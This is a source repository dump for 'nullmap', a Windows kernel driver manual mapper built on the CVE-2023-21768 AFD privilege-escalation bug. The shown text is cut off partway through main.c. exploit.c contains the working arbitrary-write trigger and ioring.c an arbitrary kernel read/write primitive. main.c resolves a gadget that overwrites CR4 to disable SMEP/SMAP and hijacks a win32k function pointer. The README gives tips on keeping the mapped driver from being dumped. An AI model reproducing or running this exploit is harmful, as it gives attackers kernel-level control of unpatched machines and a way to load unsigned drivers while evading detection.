Project Path: arc_gmh5225_nullmap_9sjdiydp

Source Tree:

```txt
arc_gmh5225_nullmap_9sjdiydp
├── README.md
└── nullmap
    ├── nullmap
    │   ├── console.c
    │   ├── console.h
    │   ├── exploit.c
    │   ├── exploit.h
    │   ├── general.h
    │   ├── ioring.c
    │   ├── ioring.h
    │   ├── main.c
    │   ├── mapper.c
    │   ├── mapper.h
    │   ├── nullmap.vcxproj
    │   ├── nullmap.vcxproj.filters
    │   ├── utils.c
    │   └── utils.h
    └── nullmap.sln

```

`README.md`:

```md
# nullmap
A very simple driver manual mapper based on my older [voidmap](https://github.com/SamuelTulach/voidmap) and [CVE-2023-21768 POC](https://github.com/xforcered/Windows_LPE_AFD_CVE-2023-21768) by [chompie](https://twitter.com/chompie1337) and [b33f](https://twitter.com/FuzzySec). Because the underlying IoRing post-exploitation memory r/w primitive is not handling many consequent reads and writes very well, I've decided to overwrite CR4 to disable SMEP/SMAP to execute the driver mapped in usermode. Tested on Windows 11 22H2 (22621.525). 

Usage:
```
nullmap.exe <path_to_driver>
```

Possible problems:
- Manual mapped driver will be in a pool allocated by ExAllocatePool. If you want to use this for anything more serious you should consider finding a better way of memory allocation so it can't be dumped so easily.
- There is no easy way to read the original cr4 value which means that I had to hardcode the value that was there on my system. While it should be the same for most modern CPUs, you should still double-check that the value is correct.
- I've hard-coded offset to NtGdiGetEmbUFI since there is no easy way to sigscan it, which means that you will have to update this offset for your specific Windows build.
- It was written in one afternoon, it might not be the cleanest code base.

Video:

[![video](https://img.youtube.com/vi/qdAZ8mTsTrc/0.jpg)](https://www.youtube.com/watch?v=qdAZ8mTsTrc)

```

`nullmap/nullmap.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.5.33424.131
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "nullmap", "nullmap\nullmap.vcxproj", "{5A03ED1B-560F-477B-8C26-DFECF71CAB4F}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{5A03ED1B-560F-477B-8C26-DFECF71CAB4F}.Debug|x64.ActiveCfg = Debug|x64
		{5A03ED1B-560F-477B-8C26-DFECF71CAB4F}.Debug|x64.Build.0 = Debug|x64
		{5A03ED1B-560F-477B-8C26-DFECF71CAB4F}.Debug|x86.ActiveCfg = Debug|Win32
		{5A03ED1B-560F-477B-8C26-DFECF71CAB4F}.Debug|x86.Build.0 = Debug|Win32
		{5A03ED1B-560F-477B-8C26-DFECF71CAB4F}.Release|x64.ActiveCfg = Release|x64
		{5A03ED1B-560F-477B-8C26-DFECF71CAB4F}.Release|x64.Build.0 = Release|x64
		{5A03ED1B-560F-477B-8C26-DFECF71CAB4F}.Release|x86.ActiveCfg = Release|Win32
		{5A03ED1B-560F-477B-8C26-DFECF71CAB4F}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {D65F27F8-1849-452C-A18C-A0D452CBF903}
	EndGlobalSection
EndGlobal

```

`nullmap/nullmap/console.c`:

```c
#include "general.h"

void ConsoleBase(enum ConsoleColor color, const char* prefix, const char* text, va_list args)
{
	const HANDLE consoleHandle = GetStdHandle(STD_OUTPUT_HANDLE);

	SetConsoleTextAttribute(consoleHandle, White);
	printf("[");

	SetConsoleTextAttribute(consoleHandle, color);
	printf("%s", prefix);

	SetConsoleTextAttribute(consoleHandle, White);
	printf("] ");

	SetConsoleTextAttribute(consoleHandle, DarkWhite);
	vprintf(text, args);
	printf("\n");
}

void ConsoleInfo(const char* text, ...)
{
	va_list args;
	va_start(args, text);
	ConsoleBase(Cyan, "i", text, args);
	va_end(args);
}

void ConsoleWarning(const char* text, ...)
{
	va_list args;
	va_start(args, text);
	ConsoleBase(Yellow, "w", text, args);
	va_end(args);
}

void ConsoleError(const char* text, ...)
{
	va_list args;
	va_start(args, text);
	ConsoleBase(Red, "e", text, args);
	va_end(args);
}

void ConsoleSuccess(const char* text, ...)
{
	va_list args;
	va_start(args, text);
	ConsoleBase(Green, "s", text, args);
	va_end(args);
}

void ConsoleTitle(const char* name)
{
	const HANDLE consoleHandle = GetStdHandle(STD_OUTPUT_HANDLE);

	SetConsoleTextAttribute(consoleHandle, Purple);
	printf("%s\n", name);

	SetConsoleTextAttribute(consoleHandle, DarkWhite);
	printf("build on %s\n\n", __DATE__);
}
```

`nullmap/nullmap/console.h`:

```h
#pragma once

enum ConsoleColor
{
	Default,
	DarkBlue,
	DarkGreen,
	DarkCyan,
	DarkRed,
	DarkPurple,
	DarkYellow,
	DarkWhite,
	DarkGrey,
	DarkBlueLite,
	Green,
	Cyan,
	Red,
	Purple,
	Yellow,
	White
};

void ConsoleBase(enum ConsoleColor color, const char* prefix, const char* text, va_list args);
void ConsoleInfo(const char* text, ...);
void ConsoleWarning(const char* text, ...);
void ConsoleError(const char* text, ...);
void ConsoleSuccess(const char* text, ...);
void ConsoleTitle(const char* name);
```

`nullmap/nullmap/exploit.c`:

```c
#include "general.h"

#define AFD_NOTIFYSOCK_IOCTL 0x12127

typedef struct AFD_NOTIFYSOCK_DATA
{
	HANDLE Completion;
	PVOID Data1;
	PVOID Data2;
	PVOID PwnPtr;
	DWORD Counter;
	DWORD Timeout;
	DWORD Length;
	char Padding[0x4];
}AFD_NOTIFYSOCK_DATA;

BOOL ExploitWrite0x1(void* targetAddress)
{
	BYTE extendedAttributes[] =
	{
		0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x1E, 0x00, 0x41, 0x66, 0x64, 0x4F, 0x70, 0x65, 0x6E, 0x50,
		0x61, 0x63, 0x6B, 0x65, 0x74, 0x58, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x60, 0xEF, 0x3D, 0x47, 0xFE
	};

	HANDLE completionHandle = INVALID_HANDLE_VALUE;
	NTSTATUS status = NtCreateIoCompletion(&completionHandle, MAXIMUM_ALLOWED, NULL, 1);
	if (!NT_SUCCESS(status))
		return FALSE;

	IO_STATUS_BLOCK ioStatusBlock = { 0 };
	status = NtSetIoCompletion(completionHandle, 0x1337, (UINT_PTR)&ioStatusBlock, 0, 0x100);
	if (!NT_SUCCESS(status))
		return FALSE;

	UNICODE_STRING objectFilePath = { 0 };
	objectFilePath.Buffer = (PWSTR)L"\\Device\\Afd\\Endpoint";
	objectFilePath.Length = (USHORT)wcslen(objectFilePath.Buffer) * sizeof(wchar_t);
	objectFilePath.MaximumLength = objectFilePath.Length;

	OBJECT_ATTRIBUTES objectAttributes = { 0 };
	objectAttributes.Length = sizeof(objectAttributes);
	objectAttributes.ObjectName = &objectFilePath;
	objectAttributes.Attributes = 0x40;

	HANDLE socketHandle = INVALID_HANDLE_VALUE;
	status = NtCreateFile(&socketHandle, MAXIMUM_ALLOWED, &objectAttributes, &ioStatusBlock, NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, 1, 0, extendedAttributes, sizeof(extendedAttributes));
	if (!NT_SUCCESS(status))
		return FALSE;

	AFD_NOTIFYSOCK_DATA afdNotifysockData = { 0 };
	afdNotifysockData.Completion = completionHandle;
	afdNotifysockData.Data1 = VirtualAlloc(NULL, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	afdNotifysockData.Data2 = VirtualAlloc(NULL, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	afdNotifysockData.Counter = 0x1;
	afdNotifysockData.Length = 0x1;
	afdNotifysockData.Timeout = 100000000;
	afdNotifysockData.PwnPtr = targetAddress;

	if (afdNotifysockData.Data1 == NULL || afdNotifysockData.Data2 == NULL)
		return FALSE;

	HANDLE eventHandle = CreateEvent(NULL, 0, 0, NULL);
	if (!eventHandle || eventHandle == INVALID_HANDLE_VALUE)
		return FALSE;

	NtDeviceIoControlFile(socketHandle, eventHandle, NULL, NULL, &ioStatusBlock, AFD_NOTIFYSOCK_IOCTL, &afdNotifysockData, 0x30, NULL, 0);

	if (completionHandle != INVALID_HANDLE_VALUE)
		CloseHandle(completionHandle);

	if (socketHandle != INVALID_HANDLE_VALUE)
		CloseHandle(completionHandle);

	if (!eventHandle && eventHandle != INVALID_HANDLE_VALUE)
		CloseHandle(eventHandle);

	if (!afdNotifysockData.Data1)
		VirtualFree(afdNotifysockData.Data1, 0, MEM_RELEASE);

	if (!afdNotifysockData.Data2)
		VirtualFree(afdNotifysockData.Data2, 0, MEM_RELEASE);

	return TRUE;
}
```

`nullmap/nullmap/exploit.h`:

```h
#pragma once

typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID    Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

__kernel_entry NTSTATUS WINAPI NtCreateIoCompletion(
	PHANDLE IoCompletionHandle,
	ACCESS_MASK DesiredAccess,
	OBJECT_ATTRIBUTES* ObjectAttributes,
	DWORD NumberOfConcurrentThreads
);


__kernel_entry NTSTATUS WINAPI NtRemoveIoCompletion(
	HANDLE IoCompletionHandle,
	PUINT_PTR KeyContext,
	PUINT_PTR ApcContext,
	PIO_STATUS_BLOCK IoStatusBlock,
	PLARGE_INTEGER Timeout
);

__kernel_entry NTSTATUS WINAPI NtSetIoCompletion(
	HANDLE IoCompletionHandle,
	UINT_PTR KeyContext,
	UINT_PTR ApcContext,
	UINT_PTR Status,
	UINT_PTR IoStatusInformation
);

__kernel_entry NTSTATUS WINAPI NtCreateFile(
	PHANDLE FileHandle,
	 ACCESS_MASK DesiredAccess,
	 OBJECT_ATTRIBUTES* ObjectAttributes,
	 PIO_STATUS_BLOCK IoStatusBlock,
	 PLARGE_INTEGER AllocationSize,
	 ULONG FileAttributes,
	 ULONG ShareAccess,
	 ULONG CreateDisposition,
	 ULONG CreateOptions,
	 PVOID EaBuffer,
	 ULONG EaLength
);

__kernel_entry NTSTATUS WINAPI NtDeviceIoControlFile(
	HANDLE  FileHandle,
	HANDLE Event,
	PVOID ApcRoutine,
	PVOID ApcContext,
	PIO_STATUS_BLOCK IoStatusBlock,
	ULONG IoControlCode,
	PVOID InputBuffer,
	ULONG InputBufferLength,
	PVOID OutputBuffer,
	ULONG OutputBufferLength
);

BOOL ExploitWrite0x1(void* targetAddress);
```

`nullmap/nullmap/general.h`:

```h
#pragma once

#include <Windows.h>
#include <stdio.h>
#include <stdarg.h>
#include <winddi.h>
#include <SubAuth.h>
#include <ioringapi.h>

#include "console.h"
#include "utils.h"
#include "mapper.h"
#include "ioring.h"
#include "exploit.h"
```

`nullmap/nullmap/ioring.c`:

```c
#include "general.h"

HIORING ioRingHandle = NULL;
PIORING_OBJECT ioRingObject = NULL;
HANDLE inputPipe = INVALID_HANDLE_VALUE;
HANDLE outputPipe = INVALID_HANDLE_VALUE;
HANDLE inputPipeFile = INVALID_HANDLE_VALUE;
HANDLE outputPipeFile = INVALID_HANDLE_VALUE;

const PVOID targetAddress = (PVOID)0x1000000;
PVOID fakeRegBuffer = 0;

BOOL IoRingSetup(PIORING_OBJECT* ioRingObjectPointer)
{
	IORING_CREATE_FLAGS ioRingFlags = { 0 };
	ioRingFlags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
	ioRingFlags.Advisory = IORING_CREATE_REQUIRED_FLAGS_NONE;

	HRESULT status = CreateIoRing(IORING_VERSION_3, ioRingFlags, 0x10000, 0x20000, &ioRingHandle);
	if (status != S_OK)
		return FALSE;

	BOOL objectStatus = UtilsGetObjectPointer(GetCurrentProcessId(), *(PHANDLE)ioRingHandle, (PULONG64)ioRingObjectPointer);
	if (!objectStatus)
		return FALSE;

	ioRingObject = *ioRingObjectPointer;

	inputPipe = CreateNamedPipe(L"\\\\.\\pipe\\ioring_in", PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
	outputPipe = CreateNamedPipe(L"\\\\.\\pipe\\ioring_out", PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
	if (inputPipe == INVALID_HANDLE_VALUE || outputPipe == INVALID_HANDLE_VALUE)
		return FALSE;

	inputPipeFile = CreateFile(L"\\\\.\\pipe\\ioring_in", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	outputPipeFile = CreateFile(L"\\\\.\\pipe\\ioring_out", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (inputPipeFile == INVALID_HANDLE_VALUE || outputPipeFile == INVALID_HANDLE_VALUE)
		return FALSE;

	if (!fakeRegBuffer)
	{
		fakeRegBuffer = VirtualAlloc(targetAddress, sizeof(ULONG64), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (fakeRegBuffer != targetAddress)
			return FALSE;
	}

	memset(fakeRegBuffer, 0, sizeof(ULONG64));
	return TRUE;
}

BOOL IoRingRead(PULONG64 registerBuffers, ULONG64 readAddress, PVOID readBuffer, ULONG readLength)
{
	IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(outputPipeFile);
	IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
	IORING_CQE cqe = { 0 };

	PIOP_MC_BUFFER_ENTRY bufferEntry = VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);
	if (!bufferEntry)
		return FALSE;

	bufferEntry->Address = (PVOID)readAddress;
	bufferEntry->Length = readLength;
	bufferEntry->Type = 0xc02;
	bufferEntry->Size = 0x80;
	bufferEntry->AccessMode = 1;
	bufferEntry->ReferenceCount = 1;

	registerBuffers[0] = (ULONG64)bufferEntry;

	HRESULT status = BuildIoRingWriteFile(ioRingHandle, reqFile, reqBuffer, readLength, 0, FILE_WRITE_FLAGS_NONE, (UINT_PTR)NULL, IOSQE_FLAGS_NONE);
	if (status != S_OK)
		return FALSE;

	status = SubmitIoRing(ioRingHandle, 0, 0, NULL);
	if (status != S_OK)
		return FALSE;

	status = PopIoRingCompletion(ioRingHandle, &cqe);
	if (status != S_OK)
		return FALSE;

	if (cqe.ResultCode != S_OK)
		return FALSE;

	if (!ReadFile(outputPipe, readBuffer, readLength, NULL, NULL))
		return FALSE;

	return TRUE;
}

BOOL IoRingWrite(PULONG64 registerBuffers, ULONG64 writeAddress, PVOID writeBuffer, ULONG writeLength)
{
	IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(inputPipeFile);
	IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
	IORING_CQE cqe = { 0 };

	if (!WriteFile(inputPipe, writeBuffer, writeLength, NULL, NULL))
		return FALSE;

	PIOP_MC_BUFFER_ENTRY bufferEntry = VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);
	if (!bufferEntry)
		return FALSE;

	bufferEntry->Address = (PVOID)writeAddress;
	bufferEntry->Length = writeLength;
	bufferEntry->Type = 0xc02;
	bufferEntry->Size = 0x80;
	bufferEntry->AccessMode = 1;
	bufferEntry->ReferenceCount = 1;

	registerBuffers[0] = (ULONG64)bufferEntry;

	HRESULT status = BuildIoRingReadFile(ioRingHandle, reqFile, reqBuffer, writeLength, 0, (UINT_PTR)NULL, IOSQE_FLAGS_NONE);
	if (status != S_OK)
		return FALSE;

	status = SubmitIoRing(ioRingHandle, 0, 0, NULL);
	if (status != S_OK)
		return FALSE;

	status = PopIoRingCompletion(ioRingHandle, &cqe);
	if (status != S_OK)
		return FALSE;

	if (cqe.ResultCode != S_OK)
		return FALSE;

	return TRUE;
}

BOOL IoRingReadHelper(ULONG64 readAddress, PVOID readBuffer, ULONG readLength)
{
	volatile _HIORING* handleStructure = *(_HIORING**)&ioRingHandle;
	handleStructure->RegBufferArray = fakeRegBuffer;
	handleStructure->BufferArraySize = 1;
	return IoRingRead(fakeRegBuffer, readAddress, readBuffer, readLength);
}

BOOL IoRingWriteHelper(ULONG64 writeAddress, PVOID writeBuffer, ULONG writeLength)
{
	volatile _HIORING* handleStructure = *(_HIORING**)&ioRingHandle;
	handleStructure->RegBufferArray = fakeRegBuffer;
	handleStructure->BufferArraySize = 1;
	return IoRingWrite(fakeRegBuffer, writeAddress, writeBuffer, writeLength);;
}

BOOL IoRingRundown()
{
	BYTE zeros[0x10] = { 0 };
	IoRingWrite(fakeRegBuffer, (ULONG64)&ioRingObject->RegBuffersCount, &zeros, 0x10);
	return TRUE;
}
```

`nullmap/nullmap/ioring.h`:

```h
#pragma once

typedef struct _OBJECT_TYPE_INFORMATION
{
    UNICODE_STRING TypeName;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    BOOLEAN TypeIndex;
    CHAR ReservedByte;
    ULONG PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    unsigned short UniqueProcessId;
    unsigned short CreatorBackTraceIndex;
    unsigned char ObjectTypeIndex;
    unsigned char HandleAttributes;
    unsigned short HandleValue;
    void* Object;
    unsigned long GrantedAccess;
    long __PADDING__[1];
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    unsigned long NumberOfHandles;
    struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct _DISPATCHER_HEADER
{
    union
    {
        volatile long Lock;
        long LockNV;
        struct
        {
            unsigned char Type;
            unsigned char Signalling;
            unsigned char Size;
            unsigned char Reserved1;
        };
        struct
        {
            unsigned char TimerType;
            union
            {
                unsigned char TimerControlFlags;
                struct
                {
                    struct
                    {
                        unsigned char Absolute : 1;
                        unsigned char Wake : 1;
                        unsigned char EncodedTolerableDelay : 6;
                    };
                    unsigned char Hand;
                    union
                    {
                        unsigned char TimerMiscFlags;
                        struct
                        {
                            unsigned char Index : 6;
                            unsigned char Inserted : 1;
                            volatile unsigned char Expired : 1;
                        };
                    };
                };
            };
        };
        struct
        {
            unsigned char Timer2Type;
            union
            {
                unsigned char Timer2Flags;
                struct
                {
                    struct
                    {
                        unsigned char Timer2Inserted : 1;
                        unsigned char Timer2Expiring : 1;
                        unsigned char Timer2CancelPending : 1;
                        unsigned char Timer2SetPending : 1;
                        unsigned char Timer2Running : 1;
                        unsigned char Timer2Disabled : 1;
                        unsigned char Timer2ReservedFlags : 2;
                    };
                    unsigned char Timer2ComponentId;
                    unsigned char Timer2RelativeId;
                };
            };
        };
        struct
        {
            unsigned char QueueType;
            union
            {
                unsigned char QueueControlFlags;
                struct
                {
                    struct
                    {
                        unsigned char Abandoned : 1;
                        unsigned char DisableIncrement : 1;
                        unsigned char QueueReservedControlFlags : 6;
                    };
                    unsigned char QueueSize;
                    unsigned char QueueReserved;
                };
            };
        };
        struct
        {
            unsigned char ThreadType;
            unsigned char ThreadReserved;
            union
            {
                unsigned char ThreadControlFlags;
                struct
                {
                    struct
                    {
                        unsigned char CycleProfiling : 1;
                        unsigned char CounterProfiling : 1;
                        unsigned char GroupScheduling : 1;
                        unsigned char AffinitySet : 1;
                        unsigned char Tagged : 1;
                        unsigned char EnergyProfiling : 1;
                        unsigned char SchedulerAssist : 1;
                        unsigned char ThreadReservedControlFlags : 1;
                    };
                    union
                    {
                        unsigned char DebugActive;
                        struct
                        {
                            unsigned char ActiveDR7 : 1;
                            unsigned char Instrumented : 1;
                            unsigned char Minimal : 1;
                            unsigned char Reserved4 : 2;
                            unsigned char AltSyscall : 1;
                            unsigned char Emulation : 1;
                            unsigned char Reserved5 : 1;
                        };
                    };
                };
            };
        };
        struct
        {
            unsigned char MutantType;
            unsigned char MutantSize;
            unsigned char DpcActive;
            unsigned char MutantReserved;
        };
    };
    long SignalState;
    LIST_ENTRY WaitListHead;
} DISPATCHER_HEADER, * PDISPATCHER_HEADER;

typedef struct _KEVENT
{
    struct _DISPATCHER_HEADER Header;
} KEVENT, * PKEVENT;

typedef struct _NT_IORING_CREATE_FLAGS
{
    enum _NT_IORING_CREATE_REQUIRED_FLAGS Required;
    enum _NT_IORING_CREATE_ADVISORY_FLAGS Advisory;
} NT_IORING_CREATE_FLAGS, * PNT_IORING_CREATE_FLAGS;

typedef struct _NT_IORING_INFO
{
    enum IORING_VERSION IoRingVersion;
    struct _NT_IORING_CREATE_FLAGS Flags;
    unsigned int SubmissionQueueSize;
    unsigned int SubmissionQueueRingMask;
    unsigned int CompletionQueueSize;
    unsigned int CompletionQueueRingMask;
    struct _NT_IORING_SUBMISSION_QUEUE* SubmissionQueue;
    struct _NT_IORING_COMPLETION_QUEUE* CompletionQueue;
} NT_IORING_INFO, * PNT_IORING_INFO;

typedef struct _IOP_MC_BUFFER_ENTRY
{
    USHORT Type;
    USHORT Reserved;
    ULONG Size;
    ULONG ReferenceCount;
    ULONG Flags;
    LIST_ENTRY GlobalDataLink;
    PVOID Address;
    ULONG Length;
    CHAR AccessMode;
    ULONG MdlRef;
    struct _MDL* Mdl;
    KEVENT MdlRundownEvent;
    PULONG64 PfnArray;
    BYTE PageNodes[0x20];
} IOP_MC_BUFFER_ENTRY, * PIOP_MC_BUFFER_ENTRY;

typedef struct _IORING_OBJECT
{
    short Type;
    short Size;
    struct _NT_IORING_INFO UserInfo;
    void* Section;
    struct _NT_IORING_SUBMISSION_QUEUE* SubmissionQueue;
    struct _MDL* CompletionQueueMdl;
    struct _NT_IORING_COMPLETION_QUEUE* CompletionQueue;
    unsigned __int64 ViewSize;
    long InSubmit;
    unsigned __int64 CompletionLock;
    unsigned __int64 SubmitCount;
    unsigned __int64 CompletionCount;
    unsigned __int64 CompletionWaitUntil;
    struct _KEVENT CompletionEvent;
    unsigned char SignalCompletionEvent;
    struct _KEVENT* CompletionUserEvent;
    unsigned int RegBuffersCount;
    struct _IOP_MC_BUFFER_ENTRY** RegBuffers;
    unsigned int RegFilesCount;
    void** RegFiles;
} IORING_OBJECT, * PIORING_OBJECT;

typedef struct _HIORING
{
    HANDLE handle;
    NT_IORING_INFO Info;
    ULONG IoRingKernelAcceptedVersion;
    PVOID RegBufferArray;
    ULONG BufferArraySize;
    PVOID Unknown;
    ULONG FileHandlesCount;
    ULONG SubQueueHead;
    ULONG SubQueueTail;
}_HIORING;

BOOL IoRingSetup(PIORING_OBJECT* ioRingObjectPointer);
BOOL IoRingRead(PULONG64 registerBuffers, ULONG64 readAddress, PVOID readBuffer, ULONG readLength);
BOOL IoRingWrite(PULONG64 registerBuffers, ULONG64 writeAddress, PVOID writeBuffer, ULONG writeLength);
BOOL IoRingReadHelper(ULONG64 readAddress, PVOID readBuffer, ULONG readLength);
BOOL IoRingWriteHelper(ULONG64 writeAddress, PVOID writeBuffer, ULONG writeLength);
BOOL IoRingRundown();
```

`nullmap/nullmap/main.c`:

```c
#include "general.h"

BOOL CallKernelFunction(DWORD64 pointerKernelAddress, void* targetFunction, void* argument1, void* argument2)
{
	ConsoleInfo("Reading original function address...");
	DWORD64 originalAddress = 0;
	BOOL status = IoRingReadHelper(pointerKernelAddress, &originalAddress, sizeof(DWORD64));
	if (!status)
	{
		ConsoleError("Failed to read function pointer!");
		return FALSE;
	}

	ConsoleSuccess("Original function: 0x%p", originalAddress);

	ConsoleInfo("Writing new function address...");
	DWORD64 newAddress = (DWORD64)targetFunction;
	status = IoRingWriteHelper(pointerKernelAddress, &newAddress, sizeof(DWORD64));
	if (!status)
	{
		ConsoleError("Failed to write function pointer!");
		return FALSE;
	}

	ConsoleInfo("Calling hooked function...");
	HMODULE userModule = LoadLibraryA("user32.dll"); // has to be loaded otherwise win32u will shit itself
	if (!userModule)
		return FALSE;

	HMODULE targetModule = LoadLibraryA("win32u.dll");
	if (!targetModule)
		return FALSE;

	void* (*hookedFunction)(void*, void*);
	*(void**)&hookedFunction = GetProcAddress(targetModule, "NtGdiGetEmbUFI");
	if (!hookedFunction)
	{
		ConsoleError("Failed to get NtGdiGetEmbUFI!");
		return FALSE;
	}

	hookedFunction(argument1, argument2);

	ConsoleInfo("Writing back original function address...");
	status = IoRingWriteHelper(pointerKernelAddress, &originalAddress, sizeof(DWORD64));
	if (!status)
	{
		ConsoleError("Failed to write function pointer!");
		return FALSE;
	}

	return TRUE;
}

int main(int argc, char* argv[])
{
	ConsoleTitle("nullmap");

	if (argc != 2)
	{
		ConsoleError("Invalid parameters; read README in official repo (github.com/SamuelTulach/nullmap)");
		getchar();
		return -1;
	}

	ConsoleInfo("Reading driver file...");
	const char* driverFilePath = argv[1];
	SIZE_T driverFileSize;
	driverBuffer = UtilsReadFile(driverFilePath, &driverFileSize);
	if (!driverBuffer)
	{
		ConsoleError("Failed to read driver file!");
		getchar();
		return -1;
	}

	PIMAGE_NT_HEADERS64 imageHeaders = UtilsGetImageHeaders(driverBuffer, driverFileSize);
	if (!imageHeaders)
	{
		ConsoleError("Invalid image file!");
		getchar();
		return -1;
	}

	ConsoleSuccess("Driver timestamp: %llu", imageHeaders->FileHeader.TimeDateStamp);

	ConsoleInfo("Getting kernel base...");
	kernelBase = UtilsGetModuleBase("ntoskrnl.exe");
	if (!kernelBase)
	{
		ConsoleError("Could not get kernel base address!");
		getchar();
		return -1;
	}

	ConsoleSuccess("Kernel base: 0x%p", kernelBase);

	ConsoleInfo("Getting win32k.sys base...");
	PVOID win32kbase = UtilsGetModuleBase("win32k.sys");
	if (!win32kbase)
	{
		ConsoleError("Could not get win32k.sys base address!");
		getchar();
		return -1;
	}

	ConsoleSuccess("win32k.sys base: 0x%p", win32kbase);

	ConsoleInfo("Loading kernel image locally...");
	HMODULE kernelHandle = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!kernelHandle)
	{
		ConsoleError("Failed to load kernel image locally!");
		getchar();
		return -1;
	}

	ConsoleSuccess("Local base: 0x%p", kernelHandle);

	ConsoleInfo("Loading win32k.sys image locally...");
	HMODULE win32kHandle = LoadLibraryExA("win32k.sys", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!win32kHandle)
	{
		ConsoleError("Failed to load win32k.sys image locally!");
		getchar();
		return -1;
	}

	ConsoleSuccess("Local base: 0x%p", kernelHandle);

	ConsoleInfo("Resolving KeFlushCurrentTbImmediately...");
	DWORD64 gadget = (DWORD64)GetProcAddress(kernelHandle, "KeFlushCurrentTbImmediately");
	if (!gadget)
	{
		ConsoleError("Failed to load kernel image locally!");
		getchar();
		return -1;
	}

	ConsoleSuccess("KeFlushCurrentTbImmediately: 0x%p", gadget);

	ConsoleInfo("Resolving gadget address...");
	//
	// KeFlushCurrentTbImmediately + 0x17
	// mov     cr4, rcx
	// retn
	//
	gadget += 0x17;

	DWORD64 gadgetKernelAddress = (DWORD64)kernelBase + gadget - (DWORD64)kernelHandle;
	ConsoleSuccess("Gadget: 0x%p", gadgetKernelAddress);

	//
	// Using jmp rdx here to get around KERNEL_SECURITY_CHECK_FAILURE
	// since win32k uses control flow guard
	//
	ConsoleInfo("Resolving jump address...");
	DWORD64 jumpScan = UtilsFindPatternImage(kernelHandle, "FF E2");
	if (!jumpScan)
	{
		ConsoleError("Failed to find jump address!");
		getchar();
		return -1;
	}

	DWORD64 jumpKernelAddress = (DWORD64)kernelBase + jumpScan - (DWORD64)kernelHandle;
	ConsoleSuccess("jmp rdx: 0x%p", jumpKernelAddress);

	ConsoleInfo("Resolving NtGdiGetEmbUFI...");
	DWORD64 pointerKernelAddress = (DWORD64)win32kbase + 0x6ff88; // .data:FFFFF97FFF06FF88DATA XREF: NtGdiGetEmbUFI
	ConsoleSuccess("NtGdiGetEmbUFI: 0x%p", pointerKernelAddress);

	ConsoleInfo("Setting up IoRing exploit...");
	PIORING_OBJECT ioRingObject = NULL;
	BOOL status = IoRingSetup(&ioRingObject);
	if (!status)
	{
		ConsoleError("Failed to setup IoRing!");
		return -1;
	}

	ConsoleSuccess("IORING_OBJECT: 0x%p", ioRingObject);

